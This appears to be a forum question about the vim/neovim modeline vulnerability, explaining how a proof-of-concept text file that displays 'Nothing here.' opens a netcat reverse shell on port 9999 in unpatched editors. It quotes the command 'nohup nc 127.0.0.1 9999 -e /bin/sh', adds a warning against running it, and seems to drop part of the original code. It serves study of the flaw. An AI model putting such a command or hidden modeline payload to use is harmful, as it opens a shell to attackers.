A vim/neovim vulnerability was discovered recently (and has been patched now in vim 8.1.1467). Besides instructions for patching, a proof of concept was included as a text file with the content
appears to be the actual command with the nohup nc 127.0.0.1 9999 -e /bin/sh starting the reverse shell). 
This question includes code from the original description of the vulnerability and proof of concept file. It will in the worst case open a reverse shell that may grant privileges to other users and provide a shell interface to outside attackers. Do not execute this on unless (1) you know that your system is not accessible to third parties (firewall, no multi-user-systems) and (2) you know how to shut the shell down if it accidentally opens.
The idea seems to be that while the text file will appear to onlu contain the string "Nothing here.", it will open a reverse shell /bin/sh on port 9999 with netcat (nc) when opened with unpatched vim/neovim versions. 
It appears that this vulnerability has been there and remained undetected for quite a number of years. Patching, updating (not available on all systems yet) or disabling modelines will fix the problem. Of course, there are no guarantees that similar vulnerabilities might not continue to pop up in the future. This is why I think it useful to study this one.
